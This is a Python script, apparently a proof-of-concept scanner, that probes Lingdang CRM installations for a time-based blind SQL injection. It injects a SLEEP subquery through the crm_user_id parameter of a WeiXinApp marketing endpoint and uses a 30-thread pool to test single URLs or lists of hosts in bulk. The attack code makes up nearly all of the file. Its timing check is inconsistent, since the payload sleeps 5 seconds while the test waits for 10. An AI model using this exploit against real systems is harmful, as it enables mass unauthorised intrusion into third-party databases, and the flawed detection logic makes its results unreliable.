import requests
import argparse
from multiprocessing.dummy import Pool
import datetime
requests.packages.urllib3.disable_warnings()


def check(target):
    url = f"{target}/crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(5)))x)"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    }
    try:
        time1 = datetime.datetime.now()
        response = requests.get(url=url, headers=headers, verify=False, timeout=15)
        time2 = datetime.datetime.now()
        time3 = (time2 - time1).total_seconds()
        if response.status_code == 200 and time3 >= 10:

            print(f"[*] {target}[*]存在漏洞")
        else:
            print(f"[!] {target}[-]不存在漏洞")
    except requests.exceptions.RequestException as e:
        print(f"{target}[-]超时")


if __name__ == '__main__':
    banner = """
     .----------------.  .----------------.  .----------------.  .----------------.
    | .--------------. || .--------------. || .--------------. || .--------------. |
    | | ____    ____ | || |      __      | || |     _____    | || |  ___  ____   | |
    | ||_   \  /   _|| || |     /  \     | || |    |_   _|   | || | |_  ||_  _|  | |
    | |  |   \/   |  | || |    / /\ \    | || |      | |     | || |   | |_/ /    | |
    | |  | |\  /| |  | || |   / ____ \   | || |   _  | |     | || |   |  __'.    | |
    | | _| |_\/_| |_ | || | _/ /    \ \_ | || |  | |_' |     | || |  _| |  \ \_  | |
    | ||_____||_____|| || ||____|  |____|| || |  `.___.'     | || | |____||____| | |
    | |              | || |              | || |              | || |              | |
    | '--------------' || '--------------' || '--------------' || '--------------' |
    '----------------'  '----------------'  '----------------'  '----------------'



    """
    print(banner)
    parse = argparse.ArgumentParser(description="灵当CRM系统index.php存在SQL注入漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(30)

if args.url:
    if "http" in args.url:
        check(args.url)
    else:
        t2 = f"http://{args.url}"
        check(t2)
        t3 = f"https://{args.url}"
        check(t3)
elif args.file:
    f1 = open(args.file, 'r')
    targets = []
    for l in f1.readlines():
        l = l.strip()
        if "http" in l:
            target = f"{l}"
            targets.append(target)
        else:
            target = f"http://{l}"
            targets.append(target)
            target1 = f"https://{l}"
            targets.append(target1)
    pool.map(check, targets)
    pool.close()

